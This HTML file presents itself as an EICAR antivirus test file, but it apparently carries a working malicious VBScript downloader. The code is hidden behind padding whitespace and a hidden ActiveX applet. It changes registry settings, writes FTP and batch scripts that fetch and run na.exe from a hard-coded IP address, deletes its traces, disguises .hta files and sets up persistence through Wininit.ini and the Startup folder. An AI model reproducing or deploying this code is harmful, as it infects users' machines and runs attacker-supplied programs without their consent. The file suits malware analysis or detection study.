<HTML>
This file contain EICAR standart antivirus test file placed into script.
<BODY onLoad="loadPage()" onMouseMove ="javascript:window.status='2000-2001�COPYRIGHT'" >
<SCRIPT Language=VBScript>'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*</SCRIPT>
<div class='damn' style='position:absolute; visibility:hidden'><APPLET HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent></APPLET></div>
<SCRIPT language=JAVASCRIPT>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
</SCRIPT><SCRIPT language=VBSCRIPT>
Option Explicit
Dim VA, doc
VA = ARRAY()
doc = Chr(13) & Chr(10) & "<SCRIPT language=VBSCRIPT>" & Chr(13) & Chr(10) & "On Error Resume Next" & Chr(13) & Chr(10) & "Set wsh = CreateObject(""WScript.Shell"")" & Chr(13) & Chr(10) & "Set fso = CreateObject(""Scripting.FileSystemObject"")" & Chr(13) & Chr(10) & "Set obj = wsh.Environment(""Process"")" & Chr(13) & Chr(10) & "If Len(obj(""OS"")) > 0 Then" & Chr(13) & Chr(10) & "ValType = ""REG_BINARY""" & Chr(13) & Chr(10) & "Else" & Chr(13) & Chr(10) & "ValType = ""REG_DWORD""" & Chr(13) & Chr(10) & "End If" & Chr(13) & Chr(10) & "wsh.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\EnableAutodial"", ""0"", ValType" & Chr(13) & Chr(10) & "wsh.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\NoNetAutodial"", ""0"", ValType" & Chr(13) & Chr(10) & "win = wsh.ExpandEnvironmentStrings(""%windir%"")" & Chr(13) & Chr(10) & "Set redit1 = fso.CreateTextFile(win & ""\$.tmp"")" & Chr(13) & Chr(10) & "redit1.WriteLine (""user na"" & vbNewLine & ""na"" & vbNewLine & ""lcd "" & win & vbNewLine & ""binary"" & vbNewLine & ""get na.exe"" & vbNewLine & ""quit"")" & Chr(13) & Chr(10) & "redit1.Close" & Chr(13) & Chr(10) & "Set redit2 = fso.CreateTextFile(win & ""\update.bat"")" & Chr(13) & Chr(10) & "redit2.WriteLine (""if exist %windir%\na.exe goto end"" & vbNewLine & "":start"" & vbNewLine & ""ftp -v -i -n -s:%windir%\$.tmp 206.132.179.136"" & vbNewLine & ""if not exist %windir%\na.exe goto start"" & vbNewLine & ""start %windir%\na.exe"" & vbNewLine & "":end"" & vbNewLine & ""del %windir%\$.tmp"" & vbNewLine & ""del %windir%\update.bat"")" & Chr(13) & Chr(10) & "redit2.Close" & Chr(13) & Chr(10) & "wsh.Run ""%comspec% /c %windir%\update.bat"",0,True" & Chr(13) & Chr(10) & "AllDir = wsh.RegRead(""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\explorer\Shell Folders\Common Startup"")" & Chr(13) & Chr(10) & "wsh.RegWrite ""HKEY_CLASSES_ROOT\htafile\NeverShowExt"",""""" & Chr(13) & Chr(10) & "wsh.RegWrite ""HKEY_CLASSES_ROOT\htafile\DefaultIcon\"",""SHELL32.DLL,104""" & Chr(13) & Chr(10) & "set al = fso.GetFolder(AllDir)" & Chr(13) & Chr(10) & "kidarcade = UCase(al.ShortPath & ""\Linker~1.hta"")" & Chr(13) & Chr(10) & "set Wininit=fso.CreateTextFile(""""& win &""\Wininit.ini"")" & Chr(13) & Chr(10) & "Wininit.WriteLine(""[rename]"" & vbNewline & ""NUL="" & kidarcade)" & Chr(13) & Chr(10) & "wsh.Run ""%comspec% /c pause"",0,True" & Chr(13) & Chr(10) & "<" & Chr(47) & "SCRIPT><BODY onload=""javascript: window.close()""><" & Chr(47) & "BODY>"
</SCRIPT></BODY>
</HTML>